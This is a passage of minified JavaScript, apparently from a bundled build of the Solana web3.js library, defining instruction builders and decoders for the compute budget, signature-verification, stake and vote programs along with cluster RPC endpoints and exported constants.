      ]),
    },
    RequestHeapFrame: {
      index: 1,
      layout: Er.struct([Er.u8("instruction"), Er.u32("bytes")]),
    },
    SetComputeUnitLimit: {
      index: 2,
      layout: Er.struct([Er.u8("instruction"), Er.u32("units")]),
    },
    SetComputeUnitPrice: {
      index: 3,
      layout: Er.struct([Er.u8("instruction"), Fs("microLamports")]),
    },
  });
  class $u {
    constructor() {}
    static requestUnits(t) {
      const e = Ds(Qu.RequestUnits, t);
      return new vs({ keys: [], programId: this.programId, data: e });
    }
    static requestHeapFrame(t) {
      const e = Ds(Qu.RequestHeapFrame, t);
      return new vs({ keys: [], programId: this.programId, data: e });
    }
    static setComputeUnitLimit(t) {
      const e = Ds(Qu.SetComputeUnitLimit, t);
      return new vs({ keys: [], programId: this.programId, data: e });
    }
    static setComputeUnitPrice(t) {
      const e = Ds(Qu.SetComputeUnitPrice, {
        microLamports: BigInt(t.microLamports),
      });
      return new vs({ keys: [], programId: this.programId, data: e });
    }
  }
  $u.programId = new Ji("ComputeBudget111111111111111111111111111111");
  const tc = Er.struct([
    Er.u8("numSignatures"),
    Er.u8("padding"),
    Er.u16("signatureOffset"),
    Er.u16("signatureInstructionIndex"),
    Er.u16("publicKeyOffset"),
    Er.u16("publicKeyInstructionIndex"),
    Er.u16("messageDataOffset"),
    Er.u16("messageDataSize"),
    Er.u16("messageInstructionIndex"),
  ]);
  class ec {
    constructor() {}
    static createInstructionWithPublicKey(t) {
      const { publicKey: e, message: n, signature: r, instructionIndex: o } = t;
      ls(
        32 === e.length,
        `Public Key must be 32 bytes but received ${e.length} bytes`
      ),
        ls(
          64 === r.length,
          `Signature must be 64 bytes but received ${r.length} bytes`
        );
      const i = tc.span,
        s = i + e.length,
        a = s + r.length,
        u = ft.alloc(a + n.length),
        c = null == o ? 65535 : o;
      return (
        tc.encode(
          {
            numSignatures: 1,
            padding: 0,
            signatureOffset: s,
            signatureInstructionIndex: c,
            publicKeyOffset: i,
            publicKeyInstructionIndex: c,
            messageDataOffset: a,
            messageDataSize: n.length,
            messageInstructionIndex: c,
          },
          u
        ),
        u.fill(e, i),
        u.fill(r, s),
        u.fill(n, a),
        new vs({ keys: [], programId: ec.programId, data: u })
      );
    }
    static createInstructionWithPrivateKey(t) {
      const { privateKey: e, message: n, instructionIndex: r } = t;
      ls(
        64 === e.length,
        `Private key must be 64 bytes but received ${e.length} bytes`
      );
      try {
        const t = Xu.fromSecretKey(e),
          o = t.publicKey.toBytes(),
          i = Wi(n, t.secretKey);
        return this.createInstructionWithPublicKey({
          publicKey: o,
          message: n,
          signature: i,
          instructionIndex: r,
        });
      } catch (o) {
        throw new Error(`Error creating instruction; ${o}`);
      }
    }
  }
  ec.programId = new Ji("Ed25519SigVerify111111111111111111111111111");
  Di.utils.isValidPrivateKey;
  const nc = Di.getPublicKey,
    rc = Er.struct([
      Er.u8("numSignatures"),
      Er.u16("signatureOffset"),
      Er.u8("signatureInstructionIndex"),
      Er.u16("ethAddressOffset"),
      Er.u8("ethAddressInstructionIndex"),
      Er.u16("messageDataOffset"),
      Er.u16("messageDataSize"),
      Er.u8("messageInstructionIndex"),
      Er.blob(20, "ethAddress"),
      Er.blob(64, "signature"),
      Er.u8("recoveryId"),
    ]);
  class oc {
    constructor() {}
    static publicKeyToEthAddress(t) {
      ls(
        64 === t.length,
        `Public key must be 64 bytes but received ${t.length} bytes`
      );
      try {
        return ft.from(mi(ji(t))).slice(-20);
      } catch (e) {
        throw new Error(`Error constructing Ethereum address: ${e}`);
      }
    }
    static createInstructionWithPublicKey(t) {
      const {
        publicKey: e,
        message: n,
        signature: r,
        recoveryId: o,
        instructionIndex: i,
      } = t;
      return oc.createInstructionWithEthAddress({
        ethAddress: oc.publicKeyToEthAddress(e),
        message: n,
        signature: r,
        recoveryId: o,
        instructionIndex: i,
      });
    }
    static createInstructionWithEthAddress(t) {
      const {
        ethAddress: e,
        message: n,
        signature: r,
        recoveryId: o,
        instructionIndex: i = 0,
      } = t;
      let s;
      (s =
        "string" == typeof e
          ? e.startsWith("0x")
            ? ft.from(e.substr(2), "hex")
            : ft.from(e, "hex")
          : e),
        ls(
          20 === s.length,
          `Address must be 20 bytes but received ${s.length} bytes`
        );
      const a = 12 + s.length,
        u = a + r.length + 1,
        c = ft.alloc(rc.span + n.length);
      return (
        rc.encode(
          {
            numSignatures: 1,
            signatureOffset: a,
            signatureInstructionIndex: i,
            ethAddressOffset: 12,
            ethAddressInstructionIndex: i,
            messageDataOffset: u,
            messageDataSize: n.length,
            messageInstructionIndex: i,
            signature: ji(r),
            ethAddress: ji(s),
            recoveryId: o,
          },
          c
        ),
        c.fill(ji(n), rc.span),
        new vs({ keys: [], programId: oc.programId, data: c })
      );
    }
    static createInstructionWithPrivateKey(t) {
      const { privateKey: e, message: n, instructionIndex: r } = t;
      ls(
        32 === e.length,
        `Private key must be 32 bytes but received ${e.length} bytes`
      );
      try {
        const t = ji(e),
          o = nc(t, !1).slice(1),
          i = ft.from(mi(ji(n))),
          [s, a] = ((t, e) => {
            const n = Di.sign(t, e);
            return [n.toCompactRawBytes(), n.recovery];
          })(i, t);
        return this.createInstructionWithPublicKey({
          publicKey: o,
          message: n,
          signature: s,
          recoveryId: a,
          instructionIndex: r,
        });
      } catch (o) {
        throw new Error(`Error creating instruction; ${o}`);
      }
    }
  }
  var ic;
  oc.programId = new Ji("KeccakSecp256k11111111111111111111111111111");
  const sc = new Ji("StakeConfig11111111111111111111111111111111");
  class ac {
    constructor(t, e) {
      (this.staker = void 0),
        (this.withdrawer = void 0),
        (this.staker = t),
        (this.withdrawer = e);
    }
  }
  class uc {
    constructor(t, e, n) {
      (this.unixTimestamp = void 0),
        (this.epoch = void 0),
        (this.custodian = void 0),
        (this.unixTimestamp = t),
        (this.epoch = e),
        (this.custodian = n);
    }
  }
  (ic = uc), (uc.default = new ic(0, 0, Ji.default));
  const cc = Object.freeze({
      Initialize: {
        index: 0,
        layout: Er.struct([
          Er.u32("instruction"),
          ((t = "authorized") =>
            Er.struct([os("staker"), os("withdrawer")], t))(),
          ((t = "lockup") =>
            Er.struct(
              [Er.ns64("unixTimestamp"), Er.ns64("epoch"), os("custodian")],
              t
            ))(),
        ]),
      },
      Authorize: {
        index: 1,
        layout: Er.struct([
          Er.u32("instruction"),
          os("newAuthorized"),
          Er.u32("stakeAuthorizationType"),
        ]),
      },
      Delegate: { index: 2, layout: Er.struct([Er.u32("instruction")]) },
      Split: {
        index: 3,
        layout: Er.struct([Er.u32("instruction"), Er.ns64("lamports")]),
      },
      Withdraw: {
        index: 4,
        layout: Er.struct([Er.u32("instruction"), Er.ns64("lamports")]),
      },
      Deactivate: { index: 5, layout: Er.struct([Er.u32("instruction")]) },
      Merge: { index: 7, layout: Er.struct([Er.u32("instruction")]) },
      AuthorizeWithSeed: {
        index: 8,
        layout: Er.struct([
          Er.u32("instruction"),
          os("newAuthorized"),
          Er.u32("stakeAuthorizationType"),
          ss("authoritySeed"),
          os("authorityOwner"),
        ]),
      },
    }),
    lc = Object.freeze({ Staker: { index: 0 }, Withdrawer: { index: 1 } });
  class dc {
    constructor() {}
    static initialize(t) {
      const { stakePubkey: e, authorized: n, lockup: r } = t,
        o = r || uc.default,
        i = Ds(cc.Initialize, {
          authorized: {
            staker: ji(n.staker.toBuffer()),
            withdrawer: ji(n.withdrawer.toBuffer()),
          },
          lockup: {
            unixTimestamp: o.unixTimestamp,
            epoch: o.epoch,
            custodian: ji(o.custodian.toBuffer()),
          },
        }),
        s = {
          keys: [
            { pubkey: e, isSigner: !1, isWritable: !0 },
            { pubkey: Cs, isSigner: !1, isWritable: !1 },
          ],
          programId: this.programId,
          data: i,
        };
      return new vs(s);
    }
    static createAccountWithSeed(t) {
      const e = new As();
      e.add(
        Gs.createAccountWithSeed({
          fromPubkey: t.fromPubkey,
          newAccountPubkey: t.stakePubkey,
          basePubkey: t.basePubkey,
          seed: t.seed,
          lamports: t.lamports,
          space: this.space,
          programId: this.programId,
        })
      );
      const { stakePubkey: n, authorized: r, lockup: o } = t;
      return e.add(
        this.initialize({ stakePubkey: n, authorized: r, lockup: o })
      );
    }
    static createAccount(t) {
      const e = new As();
      e.add(
        Gs.createAccount({
          fromPubkey: t.fromPubkey,
          newAccountPubkey: t.stakePubkey,
          lamports: t.lamports,
          space: this.space,
          programId: this.programId,
        })
      );
      const { stakePubkey: n, authorized: r, lockup: o } = t;
      return e.add(
        this.initialize({ stakePubkey: n, authorized: r, lockup: o })
      );
    }
    static delegate(t) {
      const { stakePubkey: e, authorizedPubkey: n, votePubkey: r } = t,
        o = Ds(cc.Delegate);
      return new As().add({
        keys: [
          { pubkey: e, isSigner: !1, isWritable: !0 },
          { pubkey: r, isSigner: !1, isWritable: !1 },
          { pubkey: Ss, isSigner: !1, isWritable: !1 },
          { pubkey: Os, isSigner: !1, isWritable: !1 },
          { pubkey: sc, isSigner: !1, isWritable: !1 },
          { pubkey: n, isSigner: !0, isWritable: !1 },
        ],
        programId: this.programId,
        data: o,
      });
    }
    static authorize(t) {
      const {
          stakePubkey: e,
          authorizedPubkey: n,
          newAuthorizedPubkey: r,
          stakeAuthorizationType: o,
          custodianPubkey: i,
        } = t,
        s = Ds(cc.Authorize, {
          newAuthorized: ji(r.toBuffer()),
          stakeAuthorizationType: o.index,
        }),
        a = [
          { pubkey: e, isSigner: !1, isWritable: !0 },
          { pubkey: Ss, isSigner: !1, isWritable: !0 },
          { pubkey: n, isSigner: !0, isWritable: !1 },
        ];
      return (
        i && a.push({ pubkey: i, isSigner: !0, isWritable: !1 }),
        new As().add({ keys: a, programId: this.programId, data: s })
      );
    }
    static authorizeWithSeed(t) {
      const {
          stakePubkey: e,
          authorityBase: n,
          authoritySeed: r,
          authorityOwner: o,
          newAuthorizedPubkey: i,
          stakeAuthorizationType: s,
          custodianPubkey: a,
        } = t,
        u = Ds(cc.AuthorizeWithSeed, {
          newAuthorized: ji(i.toBuffer()),
          stakeAuthorizationType: s.index,
          authoritySeed: r,
          authorityOwner: ji(o.toBuffer()),
        }),
        c = [
          { pubkey: e, isSigner: !1, isWritable: !0 },
          { pubkey: n, isSigner: !0, isWritable: !1 },
          { pubkey: Ss, isSigner: !1, isWritable: !1 },
        ];
      return (
        a && c.push({ pubkey: a, isSigner: !0, isWritable: !1 }),
        new As().add({ keys: c, programId: this.programId, data: u })
      );
    }
    static splitInstruction(t) {
      const {
          stakePubkey: e,
          authorizedPubkey: n,
          splitStakePubkey: r,
          lamports: o,
        } = t,
        i = Ds(cc.Split, { lamports: o });
      return new vs({
        keys: [
          { pubkey: e, isSigner: !1, isWritable: !0 },
          { pubkey: r, isSigner: !1, isWritable: !0 },
          { pubkey: n, isSigner: !0, isWritable: !1 },
        ],
        programId: this.programId,
        data: i,
      });
    }
    static split(t, e) {
      const n = new As();
      return (
        n.add(
          Gs.createAccount({
            fromPubkey: t.authorizedPubkey,
            newAccountPubkey: t.splitStakePubkey,
            lamports: e,
            space: this.space,
            programId: this.programId,
          })
        ),
        n.add(this.splitInstruction(t))
      );
    }
    static splitWithSeed(t, e) {
      const {
          stakePubkey: n,
          authorizedPubkey: r,
          splitStakePubkey: o,
          basePubkey: i,
          seed: s,
          lamports: a,
        } = t,
        u = new As();
      return (
        u.add(
          Gs.allocate({
            accountPubkey: o,
            basePubkey: i,
            seed: s,
            space: this.space,
            programId: this.programId,
          })
        ),
        e &&
          e > 0 &&
          u.add(
            Gs.transfer({
              fromPubkey: t.authorizedPubkey,
              toPubkey: o,
              lamports: e,
            })
          ),
        u.add(
          this.splitInstruction({
            stakePubkey: n,
            authorizedPubkey: r,
            splitStakePubkey: o,
            lamports: a,
          })
        )
      );
    }
    static merge(t) {
      const { stakePubkey: e, sourceStakePubKey: n, authorizedPubkey: r } = t,
        o = Ds(cc.Merge);
      return new As().add({
        keys: [
          { pubkey: e, isSigner: !1, isWritable: !0 },
          { pubkey: n, isSigner: !1, isWritable: !0 },
          { pubkey: Ss, isSigner: !1, isWritable: !1 },
          { pubkey: Os, isSigner: !1, isWritable: !1 },
          { pubkey: r, isSigner: !0, isWritable: !1 },
        ],
        programId: this.programId,
        data: o,
      });
    }
    static withdraw(t) {
      const {
          stakePubkey: e,
          authorizedPubkey: n,
          toPubkey: r,
          lamports: o,
          custodianPubkey: i,
        } = t,
        s = Ds(cc.Withdraw, { lamports: o }),
        a = [
          { pubkey: e, isSigner: !1, isWritable: !0 },
          { pubkey: r, isSigner: !1, isWritable: !0 },
          { pubkey: Ss, isSigner: !1, isWritable: !1 },
          { pubkey: Os, isSigner: !1, isWritable: !1 },
          { pubkey: n, isSigner: !0, isWritable: !1 },
        ];
      return (
        i && a.push({ pubkey: i, isSigner: !0, isWritable: !1 }),
        new As().add({ keys: a, programId: this.programId, data: s })
      );
    }
    static deactivate(t) {
      const { stakePubkey: e, authorizedPubkey: n } = t,
        r = Ds(cc.Deactivate);
      return new As().add({
        keys: [
          { pubkey: e, isSigner: !1, isWritable: !0 },
          { pubkey: Ss, isSigner: !1, isWritable: !1 },
          { pubkey: n, isSigner: !0, isWritable: !1 },
        ],
        programId: this.programId,
        data: r,
      });
    }
  }
  (dc.programId = new Ji("Stake11111111111111111111111111111111111111")),
    (dc.space = 200);
  class fc {
    constructor(t, e, n, r) {
      (this.nodePubkey = void 0),
        (this.authorizedVoter = void 0),
        (this.authorizedWithdrawer = void 0),
        (this.commission = void 0),
        (this.nodePubkey = t),
        (this.authorizedVoter = e),
        (this.authorizedWithdrawer = n),
        (this.commission = r);
    }
  }
  const hc = Object.freeze({
      InitializeAccount: {
        index: 0,
        layout: Er.struct([
          Er.u32("instruction"),
          ((t = "voteInit") =>
            Er.struct(
              [
                os("nodePubkey"),
                os("authorizedVoter"),
                os("authorizedWithdrawer"),
                Er.u8("commission"),
              ],
              t
            ))(),
        ]),
      },
      Authorize: {
        index: 1,
        layout: Er.struct([
          Er.u32("instruction"),
          os("newAuthorized"),
          Er.u32("voteAuthorizationType"),
        ]),
      },
      Withdraw: {
        index: 3,
        layout: Er.struct([Er.u32("instruction"), Er.ns64("lamports")]),
      },
      UpdateValidatorIdentity: {
        index: 4,
        layout: Er.struct([Er.u32("instruction")]),
      },
      AuthorizeWithSeed: {
        index: 10,
        layout: Er.struct([
          Er.u32("instruction"),
          ((t = "voteAuthorizeWithSeedArgs") =>
            Er.struct(
              [
                Er.u32("voteAuthorizationType"),
                os("currentAuthorityDerivedKeyOwnerPubkey"),
                ss("currentAuthorityDerivedKeySeed"),
                os("newAuthorized"),
              ],
              t
            ))(),
        ]),
      },
    }),
    pc = Object.freeze({ Voter: { index: 0 }, Withdrawer: { index: 1 } });
  class mc {
    constructor() {}
    static initializeAccount(t) {
      const { votePubkey: e, nodePubkey: n, voteInit: r } = t,
        o = Ds(hc.InitializeAccount, {
          voteInit: {
            nodePubkey: ji(r.nodePubkey.toBuffer()),
            authorizedVoter: ji(r.authorizedVoter.toBuffer()),
            authorizedWithdrawer: ji(r.authorizedWithdrawer.toBuffer()),
            commission: r.commission,
          },
        }),
        i = {
          keys: [
            { pubkey: e, isSigner: !1, isWritable: !0 },
            { pubkey: Cs, isSigner: !1, isWritable: !1 },
            { pubkey: Ss, isSigner: !1, isWritable: !1 },
            { pubkey: n, isSigner: !0, isWritable: !1 },
          ],
          programId: this.programId,
          data: o,
        };
      return new vs(i);
    }
    static createAccount(t) {
      const e = new As();
      return (
        e.add(
          Gs.createAccount({
            fromPubkey: t.fromPubkey,
            newAccountPubkey: t.votePubkey,
            lamports: t.lamports,
            space: this.space,
            programId: this.programId,
          })
        ),
        e.add(
          this.initializeAccount({
            votePubkey: t.votePubkey,
            nodePubkey: t.voteInit.nodePubkey,
            voteInit: t.voteInit,
          })
        )
      );
    }
    static authorize(t) {
      const {
          votePubkey: e,
          authorizedPubkey: n,
          newAuthorizedPubkey: r,
          voteAuthorizationType: o,
        } = t,
        i = Ds(hc.Authorize, {
          newAuthorized: ji(r.toBuffer()),
          voteAuthorizationType: o.index,
        }),
        s = [
          { pubkey: e, isSigner: !1, isWritable: !0 },
          { pubkey: Ss, isSigner: !1, isWritable: !1 },
          { pubkey: n, isSigner: !0, isWritable: !1 },
        ];
      return new As().add({ keys: s, programId: this.programId, data: i });
    }
    static authorizeWithSeed(t) {
      const {
          currentAuthorityDerivedKeyBasePubkey: e,
          currentAuthorityDerivedKeyOwnerPubkey: n,
          currentAuthorityDerivedKeySeed: r,
          newAuthorizedPubkey: o,
          voteAuthorizationType: i,
          votePubkey: s,
        } = t,
        a = Ds(hc.AuthorizeWithSeed, {
          voteAuthorizeWithSeedArgs: {
            currentAuthorityDerivedKeyOwnerPubkey: ji(n.toBuffer()),
            currentAuthorityDerivedKeySeed: r,
            newAuthorized: ji(o.toBuffer()),
            voteAuthorizationType: i.index,
          },
        }),
        u = [
          { pubkey: s, isSigner: !1, isWritable: !0 },
          { pubkey: Ss, isSigner: !1, isWritable: !1 },
          { pubkey: e, isSigner: !0, isWritable: !1 },
        ];
      return new As().add({ keys: u, programId: this.programId, data: a });
    }
    static withdraw(t) {
      const {
          votePubkey: e,
          authorizedWithdrawerPubkey: n,
          lamports: r,
          toPubkey: o,
        } = t,
        i = Ds(hc.Withdraw, { lamports: r }),
        s = [
          { pubkey: e, isSigner: !1, isWritable: !0 },
          { pubkey: o, isSigner: !1, isWritable: !0 },
          { pubkey: n, isSigner: !0, isWritable: !1 },
        ];
      return new As().add({ keys: s, programId: this.programId, data: i });
    }
    static safeWithdraw(t, e, n) {
      if (t.lamports > e - n)
        throw new Error(
          "Withdraw will leave vote account with insufficient funds."
        );
      return mc.withdraw(t);
    }
    static updateValidatorIdentity(t) {
      const { votePubkey: e, authorizedWithdrawerPubkey: n, nodePubkey: r } = t,
        o = Ds(hc.UpdateValidatorIdentity),
        i = [
          { pubkey: e, isSigner: !1, isWritable: !0 },
          { pubkey: r, isSigner: !0, isWritable: !1 },
          { pubkey: n, isSigner: !0, isWritable: !1 },
        ];
      return new As().add({ keys: i, programId: this.programId, data: o });
    }
  }
  (mc.programId = new Ji("Vote111111111111111111111111111111111111111")),
    (mc.space = 3762);
  const gc = new Ji("Va1idator1nfo111111111111111111111111111111"),
    yc = co({
      name: ao(),
      website: io(ao()),
      details: io(ao()),
      iconUrl: io(ao()),
      keybaseUsername: io(ao()),
    });
  class wc {
    constructor(t, e) {
      (this.key = void 0),
        (this.info = void 0),
        (this.key = t),
        (this.info = e);
    }
    static fromConfigData(t) {
      let e = [...t];
      if (2 !== us(e)) return null;
      const n = [];
      for (let r = 0; r < 2; r++) {
        const t = new Ji(ps(e, 0, Zi)),
          r = 1 === hs(e);
        n.push({ publicKey: t, isSigner: r });
      }
      if (n[0].publicKey.equals(gc) && n[1].isSigner) {
        const t = ss().decode(ft.from(e)),
          r = JSON.parse(t);
        return Zr(r, yc), new wc(n[1].publicKey, r);
      }
      return null;
    }
  }
  const bc = new Ji("Vote111111111111111111111111111111111111111"),
    vc = Er.struct([
      os("nodePubkey"),
      os("authorizedWithdrawer"),
      Er.u8("commission"),
      Er.nu64(),
      Er.seq(
        Er.struct([Er.nu64("slot"), Er.u32("confirmationCount")]),
        Er.offset(Er.u32(), -8),
        "votes"
      ),
      Er.u8("rootSlotValid"),
      Er.nu64("rootSlot"),
      Er.nu64(),
      Er.seq(
        Er.struct([Er.nu64("epoch"), os("authorizedVoter")]),
        Er.offset(Er.u32(), -8),
        "authorizedVoters"
      ),
      Er.struct(
        [
          Er.seq(
            Er.struct([
              os("authorizedPubkey"),
              Er.nu64("epochOfLastAuthorizedSwitch"),
              Er.nu64("targetEpoch"),
            ]),
            32,
            "buf"
          ),
          Er.nu64("idx"),
          Er.u8("isEmpty"),
        ],
        "priorVoters"
      ),
      Er.nu64(),
      Er.seq(
        Er.struct([
          Er.nu64("epoch"),
          Er.nu64("credits"),
          Er.nu64("prevCredits"),
        ]),
        Er.offset(Er.u32(), -8),
        "epochCredits"
      ),
      Er.struct([Er.nu64("slot"), Er.nu64("timestamp")], "lastTimestamp"),
    ]);
  class Ac {
    constructor(t) {
      (this.nodePubkey = void 0),
        (this.authorizedWithdrawer = void 0),
        (this.commission = void 0),
        (this.rootSlot = void 0),
        (this.votes = void 0),
        (this.authorizedVoters = void 0),
        (this.priorVoters = void 0),
        (this.epochCredits = void 0),
        (this.lastTimestamp = void 0),
        (this.nodePubkey = t.nodePubkey),
        (this.authorizedWithdrawer = t.authorizedWithdrawer),
        (this.commission = t.commission),
        (this.rootSlot = t.rootSlot),
        (this.votes = t.votes),
        (this.authorizedVoters = t.authorizedVoters),
        (this.priorVoters = t.priorVoters),
        (this.epochCredits = t.epochCredits),
        (this.lastTimestamp = t.lastTimestamp);
    }
    static fromAccountData(t) {
      const e = vc.decode(ji(t), 4);
      let n = e.rootSlot;
      return (
        e.rootSlotValid || (n = null),
        new Ac({
          nodePubkey: new Ji(e.nodePubkey),
          authorizedWithdrawer: new Ji(e.authorizedWithdrawer),
          commission: e.commission,
          votes: e.votes,
          rootSlot: n,
          authorizedVoters: e.authorizedVoters.map(kc),
          priorVoters: Sc(e.priorVoters),
          epochCredits: e.epochCredits,
          lastTimestamp: e.lastTimestamp,
        })
      );
    }
  }
  function kc({ authorizedVoter: t, epoch: e }) {
    return { epoch: e, authorizedVoter: new Ji(t) };
  }
  function Ic({
    authorizedPubkey: t,
    epochOfLastAuthorizedSwitch: e,
    targetEpoch: n,
  }) {
    return {
      authorizedPubkey: new Ji(t),
      epochOfLastAuthorizedSwitch: e,
      targetEpoch: n,
    };
  }
  function Sc({ buf: t, idx: e, isEmpty: n }) {
    return n ? [] : [...t.slice(e + 1).map(Ic), ...t.slice(0, e).map(Ic)];
  }
  const _c = {
    http: {
      devnet: "http://api.devnet.solana.com",
      testnet: "http://api.testnet.solana.com",
      "mainnet-beta": "http://api.mainnet-beta.solana.com/",
    },
    https: {
      devnet: "https://api.devnet.solana.com",
      testnet: "https://api.testnet.solana.com",
      "mainnet-beta": "https://api.mainnet-beta.solana.com/",
    },
  };
  const Tc = Object.freeze(
    Object.defineProperty(
      {
        __proto__: null,
        Account: class {
          constructor(t) {
            if (((this._publicKey = void 0), (this._secretKey = void 0), t)) {
              const e = ji(t);
              if (64 !== t.length) throw new Error("bad secret key size");
              (this._publicKey = e.slice(32, 64)),
                (this._secretKey = e.slice(0, 32));
            } else
              (this._secretKey = ji(Ui())),
                (this._publicKey = ji(zi(this._secretKey)));
          }
          get publicKey() {
            return new Ji(this._publicKey);
          }
          get secretKey() {
            return ft.concat([this._secretKey, this._publicKey], 64);
          }
        },
        AddressLookupTableAccount: na,
        AddressLookupTableInstruction: class {
          constructor() {}
          static decodeInstructionType(t) {
            this.checkProgramId(t.programId);
            const e = Er.u32("instruction").decode(t.data);
            let n;
            for (const [r, o] of Object.entries(Ju))
              if (o.index == e) {
                n = r;
                break;
              }
            if (!n)
              throw new Error(
                "Invalid Instruction. Should be a LookupTable Instruction"
              );
            return n;
          }
          static decodeCreateLookupTable(t) {
            this.checkProgramId(t.programId), this.checkKeysLength(t.keys, 4);
            const { recentSlot: e } = Us(Ju.CreateLookupTable, t.data);
            return {
              authority: t.keys[1].pubkey,
              payer: t.keys[2].pubkey,
              recentSlot: Number(e),
            };
          }
          static decodeExtendLookupTable(t) {
            if ((this.checkProgramId(t.programId), t.keys.length < 2))
              throw new Error(
                `invalid instruction; found ${t.keys.length} keys, expected at least 2`
              );
            const { addresses: e } = Us(Ju.ExtendLookupTable, t.data);
            return {
              lookupTable: t.keys[0].pubkey,
              authority: t.keys[1].pubkey,
              payer: t.keys.length > 2 ? t.keys[2].pubkey : void 0,
              addresses: e.map((t) => new Ji(t)),
            };
          }
          static decodeCloseLookupTable(t) {
            return (
              this.checkProgramId(t.programId),
              this.checkKeysLength(t.keys, 3),
              {
                lookupTable: t.keys[0].pubkey,
                authority: t.keys[1].pubkey,
                recipient: t.keys[2].pubkey,
              }
            );
          }
          static decodeFreezeLookupTable(t) {
            return (
              this.checkProgramId(t.programId),
              this.checkKeysLength(t.keys, 2),
              { lookupTable: t.keys[0].pubkey, authority: t.keys[1].pubkey }
            );
          }
          static decodeDeactivateLookupTable(t) {
            return (
              this.checkProgramId(t.programId),
              this.checkKeysLength(t.keys, 2),
              { lookupTable: t.keys[0].pubkey, authority: t.keys[1].pubkey }
            );
          }
          static checkProgramId(t) {
            if (!t.equals(Yu.programId))
              throw new Error(
                "invalid instruction; programId is not AddressLookupTable Program"
              );
          }
          static checkKeysLength(t, e) {
            if (t.length < e)
              throw new Error(
                `invalid instruction; found ${t.length} keys, expected at least ${e}`
              );
          }
        },
        AddressLookupTableProgram: Yu,
        Authorized: ac,
        BLOCKHASH_CACHE_TIMEOUT_MS: 3e4,
        BPF_LOADER_DEPRECATED_PROGRAM_ID: Yi,
        BPF_LOADER_PROGRAM_ID: Hs,
        BpfLoader: class {
          static getMinNumSignatures(t) {
            return Vs.getMinNumSignatures(t);
          }
          static load(t, e, n, r, o) {
            return Vs.load(t, e, n, o, r);
          }
        },
        COMPUTE_BUDGET_INSTRUCTION_LAYOUTS: Qu,
        ComputeBudgetInstruction: class {
          constructor() {}
          static decodeInstructionType(t) {
            this.checkProgramId(t.programId);
            const e = Er.u8("instruction").decode(t.data);
            let n;
            for (const [r, o] of Object.entries(Qu))
              if (o.index == e) {
                n = r;
                break;
              }
            if (!n)
              throw new Error(
                "Instruction type incorrect; not a ComputeBudgetInstruction"
              );
            return n;
          }
          static decodeRequestUnits(t) {
            this.checkProgramId(t.programId);
            const { units: e, additionalFee: n } = Us(Qu.RequestUnits, t.data);
            return { units: e, additionalFee: n };
          }
          static decodeRequestHeapFrame(t) {
            this.checkProgramId(t.programId);
            const { bytes: e } = Us(Qu.RequestHeapFrame, t.data);
            return { bytes: e };
          }
          static decodeSetComputeUnitLimit(t) {
            this.checkProgramId(t.programId);
            const { units: e } = Us(Qu.SetComputeUnitLimit, t.data);
            return { units: e };
          }
          static decodeSetComputeUnitPrice(t) {
            this.checkProgramId(t.programId);
            const { microLamports: e } = Us(Qu.SetComputeUnitPrice, t.data);
            return { microLamports: e };
          }
          static checkProgramId(t) {
            if (!t.equals($u.programId))
              throw new Error(
                "invalid instruction; programId is not ComputeBudgetProgram"
              );
          }
        },
        ComputeBudgetProgram: $u,
        Connection: Zu,
        Ed25519Program: ec,
        Enum: class extends Gi {
          constructor(t) {
            if ((super(t), (this.enum = ""), 1 !== Object.keys(t).length))
              throw new Error("Enum can only take single value");
            Object.keys(t).map((t) => {
              this.enum = t;
            });
          }
        },
        EpochSchedule: $s,
        FeeCalculatorLayout: qs,
        Keypair: Xu,
        LAMPORTS_PER_SOL: 1e9,
        LOOKUP_TABLE_INSTRUCTION_LAYOUTS: Ju,
        Loader: Vs,
        Lockup: uc,
        MAX_SEED_LENGTH: 32,
        Message: ms,
        MessageAccountKeys: rs,
        MessageV0: gs,
        NONCE_ACCOUNT_LENGTH: Ks,
        NonceAccount: Ws,
        PACKET_DATA_SIZE: Qi,
        PUBLIC_KEY_LENGTH: Zi,
        PublicKey: Ji,
        SIGNATURE_LENGTH_IN_BYTES: 64,
        SOLANA_SCHEMA: Vi,
        STAKE_CONFIG_ID: sc,
        STAKE_INSTRUCTION_LAYOUTS: cc,
        SYSTEM_INSTRUCTION_LAYOUTS: js,
        SYSVAR_CLOCK_PUBKEY: Ss,
        SYSVAR_EPOCH_SCHEDULE_PUBKEY: _s,
        SYSVAR_INSTRUCTIONS_PUBKEY: Ts,
        SYSVAR_RECENT_BLOCKHASHES_PUBKEY: Bs,
        SYSVAR_RENT_PUBKEY: Cs,
        SYSVAR_REWARDS_PUBKEY: Es,
        SYSVAR_SLOT_HASHES_PUBKEY: xs,
        SYSVAR_SLOT_HISTORY_PUBKEY: Ps,
        SYSVAR_STAKE_HISTORY_PUBKEY: Os,
        Secp256k1Program: oc,
        SendTransactionError: Rs,
        SolanaJSONRPCError: Ms,
        SolanaJSONRPCErrorCode: {
          JSON_RPC_SERVER_ERROR_BLOCK_CLEANED_UP: -32001,
          JSON_RPC_SERVER_ERROR_SEND_TRANSACTION_PREFLIGHT_FAILURE: -32002,
          JSON_RPC_SERVER_ERROR_TRANSACTION_SIGNATURE_VERIFICATION_FAILURE:
            -32003,
          JSON_RPC_SERVER_ERROR_BLOCK_NOT_AVAILABLE: -32004,
          JSON_RPC_SERVER_ERROR_NODE_UNHEALTHY: -32005,
          JSON_RPC_SERVER_ERROR_TRANSACTION_PRECOMPILE_VERIFICATION_FAILURE:
            -32006,
          JSON_RPC_SERVER_ERROR_SLOT_SKIPPED: -32007,
          JSON_RPC_SERVER_ERROR_NO_SNAPSHOT: -32008,
          JSON_RPC_SERVER_ERROR_LONG_TERM_STORAGE_SLOT_SKIPPED: -32009,
          JSON_RPC_SERVER_ERROR_KEY_EXCLUDED_FROM_SECONDARY_INDEX: -32010,
          JSON_RPC_SERVER_ERROR_TRANSACTION_HISTORY_NOT_AVAILABLE: -32011,
          JSON_RPC_SCAN_ERROR: -32012,
          JSON_RPC_SERVER_ERROR_TRANSACTION_SIGNATURE_LEN_MISMATCH: -32013,
          JSON_RPC_SERVER_ERROR_BLOCK_STATUS_NOT_AVAILABLE_YET: -32014,
          JSON_RPC_SERVER_ERROR_UNSUPPORTED_TRANSACTION_VERSION: -32015,
          JSON_RPC_SERVER_ERROR_MIN_CONTEXT_SLOT_NOT_REACHED: -32016,
        },
        StakeAuthorizationLayout: lc,
        StakeInstruction: class {
          constructor() {}
          static decodeInstructionType(t) {
            this.checkProgramId(t.programId);
            const e = Er.u32("instruction").decode(t.data);
            let n;
            for (const [r, o] of Object.entries(cc))
              if (o.index == e) {
                n = r;
                break;
              }
            if (!n)
              throw new Error(
                "Instruction type incorrect; not a StakeInstruction"
